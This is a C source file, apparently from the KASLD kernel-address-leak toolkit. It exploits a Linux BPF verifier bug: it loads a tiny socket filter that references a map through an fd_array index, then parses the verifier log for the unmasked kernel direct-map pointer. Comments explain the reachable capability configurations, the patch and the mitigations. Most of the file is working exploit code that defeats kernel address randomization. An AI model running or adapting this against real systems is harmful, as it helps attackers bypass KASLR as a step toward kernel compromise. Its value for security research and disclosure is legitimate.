// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak a kernel direct-map address from the BPF verifier log (unmasked
// BPF_PSEUDO_MAP_IDX ldimm64 immediate).
//
// The BPF verifier, when asked for an instruction-level log (log_level>=2),
// disassembles each instruction via print_bpf_insn(). For an ldimm64 whose
// source is a pointer-bearing pseudo type it is supposed to print 0x0 instead
// of the real (already-rewritten) kernel address when pointer leaks are not
// allowed (kernel/bpf/disasm.c: `if (is_ptr && !allow_ptr_leaks) imm = 0`).
// That mask historically covered only BPF_PSEUDO_MAP_FD and
// BPF_PSEUDO_MAP_VALUE; BPF_PSEUDO_MAP_IDX, BPF_PSEUDO_MAP_IDX_VALUE and
// BPF_PSEUDO_BTF_ID were left out, so the log printed the resolved kernel
// pointer verbatim. For MAP_IDX the value is `(unsigned long)map` — the address
// of the kmalloc'd `struct bpf_map`, i.e. a kernel direct-map VA. The verifier
// log is returned to the caller even when the program is rejected.
//
//   Data leaked:      a kmalloc'd `struct bpf_map *` (direct-map VA)
//   Kernel subsystem: kernel/bpf — verifier log (disasm.c print_bpf_insn)
//   Address type:     virtual (direct map / linear region)
//   Method:           parsed (hex token in the returned verifier log)
//   Patch:            print_bpf_insn masks MAP_IDX/MAP_IDX_VALUE/BTF_ID (v7.2,
//                     commit 72a85e9464a5). Hole present since fd_idx (v5.20).
//
// Scenarios in which the leak is reachable (this component only emits when a
// real kernel pointer actually comes back, so it self-detects all of these and
// is a silent no-op otherwise):
//
//   1. A process with CAP_BPF but NOT CAP_PERFMON. `allow_ptr_leaks` is granted
//      by CAP_PERFMON (bpf_allow_ptr_leaks() = bpf_token_capable(CAP_PERFMON)),
//      so such a process may load programs using these pseudo types yet is
//      supposed to be denied kernel pointers — exactly when the buggy mask
//      fires. Common for confined services / container runtimes that hand out
//      CAP_BPF but withhold CAP_PERFMON.
//   2. A BPF-token-delegated user namespace (v6.9+) whose token grants CAP_BPF
//      but not CAP_PERFMON — an unprivileged user inside such a userns.
//   3. `sysctl kernel.unprivileged_bpf_disabled = 0` (non-default on modern
//      distros, but set on some older / special-purpose systems): a fully
//      unprivileged user can load the socket filter and read its log.
//
// NOT reachable by a fully-unprivileged process on a default-hardened distro
// (`unprivileged_bpf_disabled` = 1 or 2 without CAP_BPF): BPF_PROG_LOAD returns
// EPERM and the component reports access-denied.
//
// Engine fit: emitted as a VIRT REGION_DIRECTMAP interior sample — every
// kmalloc'd object lives in the linear map, so the address bounds Q_PAGE_OFFSET
// from above (directmap_page_offset_bounds). Useful on x86_64 where the direct
// map is randomized (CONFIG_RANDOMIZE_MEMORY); a no-op where PAGE_OFFSET is
// fixed.
//
// Mitigations:
//   Patched by masking these pseudo types in the verifier log (v7.2). Otherwise
//   `unprivileged_bpf_disabled >= 1` removes the unprivileged path; withholding
//   CAP_BPF removes the confined-service path.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"

#include <errno.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

/* Older UAPI headers may predate the fd_idx pseudo source. */
#ifndef BPF_PSEUDO_MAP_IDX
#define BPF_PSEUDO_MAP_IDX 5
#endif

/* The system `union bpf_attr` on older cross-toolchain UAPI headers predates
 * the `fd_array` member (added ~v5.6), so referencing it by name fails to
 * compile there even though the runtime kernel supports it. Replicate the
 * BPF_PROG_LOAD attr up to fd_array with the exact kernel UAPI layout
 * (8-byte-aligned u64s, matching __aligned_u64 on 32-bit too). Passing this
 * shorter attr is fine: the bpf() syscall zero-fills the fields beyond it on a
 * newer kernel; on a kernel too old to have fd_array the non-zero tail is
 * rejected and the leak simply does not fire. */
typedef uint64_t kasld_aligned_u64 __attribute__((aligned(8)));
struct kasld_bpf_prog_load {
  uint32_t prog_type;
  uint32_t insn_cnt;
  kasld_aligned_u64 insns;
  kasld_aligned_u64 license;
  uint32_t log_level;
  uint32_t log_size;
  kasld_aligned_u64 log_buf;
  uint32_t kern_version;
  uint32_t prog_flags;
  char prog_name[16]; /* BPF_OBJ_NAME_LEN */
  uint32_t prog_ifindex;
  uint32_t expected_attach_type;
  uint32_t prog_btf_fd;
  uint32_t func_info_rec_size;
  kasld_aligned_u64 func_info;
  uint32_t func_info_cnt;
  uint32_t line_info_rec_size;
  kasld_aligned_u64 line_info;
  uint32_t line_info_cnt;
  uint32_t attach_btf_id;
  uint32_t attach_prog_fd;
  uint32_t core_relo_cnt;
  kasld_aligned_u64 fd_array; /* array of FDs; MAP_IDX indexes into it */
};

KASLD_EXPLAIN(
    "Loads a tiny socket-filter BPF program that references a map via an "
    "fd_array index (BPF_PSEUDO_MAP_IDX ldimm64) and requests a verifier log. "
    "Before commit 72a85e9464a5 the verifier's pointer-mask left MAP_IDX "
    "unmasked, so the log printed the resolved kernel pointer — the kmalloc'd "
    "struct bpf_map address, a direct-map VA that bounds the direct-map base. "
    "Reachable with CAP_BPF (without CAP_PERFMON), a BPF-token userns, or "
    "unprivileged_bpf_disabled=0. Emits only when a real kernel pointer "
    "returns, "
    "so it is a silent no-op on patched or non-permitting kernels.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "sysctl:unprivileged_bpf_disabled>=1\n"
           "bypass:CAP_BPF\n"
           "patch:v7.2\n");

static long bpf_(int cmd, union bpf_attr *attr, unsigned int size) {
  return syscall(SYS_bpf, cmd, attr, size);
}

/* A tiny BPF_MAP_TYPE_ARRAY: the struct bpf_map is small, so it is kmalloc'd
 * into the direct map (not vmalloc). Returns the fd, or -1 with errno set. */
static int make_array_map(void) {
  union bpf_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.map_type = BPF_MAP_TYPE_ARRAY;
  attr.key_size = 4;
  attr.value_size = 4;
  attr.max_entries = 1;
  return (int)bpf_(BPF_MAP_CREATE, &attr, sizeof(attr));
}

/* Scan the verifier log for the first hex token that is a real kernel VAS
 * address. On a patched kernel the leaked immediate prints as 0x0 and every
 * other 0x token (opcodes, offsets) fails the kernel-VAS test, so nothing is
 * returned — the component stays a no-op. */
static unsigned long first_kernel_addr_in(const char *log) {
  const char *p = log;
  while ((p = strstr(p, "0x")) != NULL) {
    char *end = NULL;
    unsigned long v = strtoul(p, &end, 16);
    p = (end && end != p) ? end : p + 2;
    if (v != 0 && kasld_addr_is_kernel_vas(v))
      return v;
  }
  return 0;
}

int main(int argc, char **argv) {
  kasld_cli(argc, argv);
  /* Live host probe: loads a BPF program into the running kernel; the leaked
   * address is this machine's, not reproducible from a captured tree. */
  if (kasld_skip_live_probe("bpf_verifier_log"))
    return 0;

  kasld_info("loading a BPF program to leak a map pointer via the verifier "
             "log ...");

  int map_fd = make_array_map();
  if (map_fd < 0) {
    if (errno == EPERM || errno == EACCES) {
      kasld_err("BPF map creation denied (unprivileged_bpf_disabled, or no "
                "CAP_BPF)");
      return KASLD_EXIT_NOPERM;
    }
    kasld_err("BPF unavailable (%s)", strerror(errno));
    return KASLD_EXIT_UNAVAILABLE;
  }

  /* r0 = map_ptr (via fd_array[0]); r0 = 0; exit — a valid socket filter whose
   * only purpose is to make the verifier disassemble the MAP_IDX ldimm64. */
  struct bpf_insn prog[] = {
      {.code = BPF_LD | BPF_DW | BPF_IMM,
       .dst_reg = BPF_REG_0,
       .src_reg = BPF_PSEUDO_MAP_IDX,
       .imm = 0},  /* fd_array index 0 */
      {.code = 0}, /* second half of the ldimm64 */
      {.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_0, .imm = 0},
      {.code = BPF_JMP | BPF_EXIT},
  };
  int map_fds[1] = {map_fd};
  char log[16384];
  log[0] = '\0';

  struct kasld_bpf_prog_load pl;
  memset(&pl, 0, sizeof(pl));
  pl.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
  pl.insn_cnt = sizeof(prog) / sizeof(prog[0]);
  pl.insns = (uint64_t)(uintptr_t)prog;
  pl.license = (uint64_t)(uintptr_t)"GPL";
  pl.log_level = 2; /* BPF_LOG_LEVEL2: per-instruction disassembly */
  pl.log_size = sizeof(log);
  pl.log_buf = (uint64_t)(uintptr_t)log;
  pl.fd_array = (uint64_t)(uintptr_t)map_fds;

  long prog_fd = bpf_(BPF_PROG_LOAD, (union bpf_attr *)&pl, sizeof(pl));
  int load_errno = errno;
  /* The log is filled whether the program was accepted or rejected. */
  if (prog_fd >= 0)
    close((int)prog_fd);
  close(map_fd);

  unsigned long addr = first_kernel_addr_in(log);
  if (addr == 0) {
    if (prog_fd < 0 && (load_errno == EPERM || load_errno == EACCES)) {
      kasld_err("BPF program load denied (unprivileged_bpf_disabled, or no "
                "CAP_BPF)");
      return KASLD_EXIT_NOPERM;
    }
    kasld_err("no kernel pointer in the verifier log (masked: patched kernel, "
              "or CAP_PERFMON grants ptr access so nothing is withheld)");
    return 0;
  }

  kasld_found("leaked direct-map map pointer via verifier log: 0x%lx", addr);
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, addr, NULL,
                      CONF_PARSED);
  return 0;
}
